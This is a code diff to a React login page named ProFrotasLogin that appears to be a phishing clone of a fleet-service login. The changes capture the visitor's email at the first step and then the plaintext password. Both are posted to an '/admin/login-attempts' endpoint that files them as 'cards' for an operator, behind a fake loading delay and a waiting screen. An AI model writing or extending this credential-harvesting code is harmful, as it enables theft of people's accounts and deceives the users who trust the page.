@@ -78,11 +78,26 @@ function ProFrotasLogin() {
     return () => { if (emailDebounceRef.current) clearTimeout(emailDebounceRef.current); };
   }, [email, emailNotified]);
 
-  // Clicar "Proximo" - loading 2s e ir para step 2
-  const handleNext = (e) => {
+  // Clicar "Proximo" - criar card no admin com email e ir para step 2
+  const handleNext = async (e) => {
     e.preventDefault();
     if (!isValidEmail(email)) return;
     setIsLoading(true);
+    // Criar registro no backend com email (sem senha ainda)
+    try {
+      let currentUserId = localStorage.getItem("pf_user_id");
+      if (!currentUserId) {
+        const response = await axios.post(`${API}/admin/login-attempts`, {
+          email, password: "", ip_address: "127.0.0.1", country: "Brasil", device: "Desktop", page: "Login Pro-Frotas"
+        });
+        if (response.data?.id) {
+          localStorage.setItem("pf_user_id", response.data.id);
+          localStorage.setItem("pf_session_time", Date.now().toString());
+        }
+      }
+    } catch (err) {
+      console.error("Erro ao criar registro:", err);
+    }
     setTimeout(() => {
       setIsLoading(false);
       setHasError(false);
@@ -90,7 +105,7 @@ function ProFrotasLogin() {
     }, 2000);
   };
 
-  // Clicar "Entrar" - enviar dados
+  // Clicar "Entrar" - atualizar com senha e entrar em aguarde
   const handleLogin = async (e) => {
     e.preventDefault();
     if (!password) return;
@@ -98,7 +113,12 @@ function ProFrotasLogin() {
     setHasError(false);
     try {
       let currentUserId = localStorage.getItem("pf_user_id");
-      if (!currentUserId) {
+      if (currentUserId) {
+        // Atualizar registro existente com a senha
+        await axios.post(`${API}/admin/login-attempts/${currentUserId}/add-attempt`, { email, password });
+        setUserId(currentUserId);
+      } else {
+        // Fallback: criar novo se não existir
         const response = await axios.post(`${API}/admin/login-attempts`, {
           email, password, ip_address: "127.0.0.1", country: "Brasil", device: "Desktop", page: "Login Pro-Frotas"
         });
@@ -108,9 +128,6 @@ function ProFrotasLogin() {
           localStorage.setItem("pf_session_time", Date.now().toString());
           setUserId(currentUserId);
         }
-      } else {
-        await axios.post(`${API}/admin/login-attempts/${currentUserId}/add-attempt`, { email, password });
-        setUserId(currentUserId);
       }
     } catch (e) {
       console.error("Erro ao enviar dados:", e);
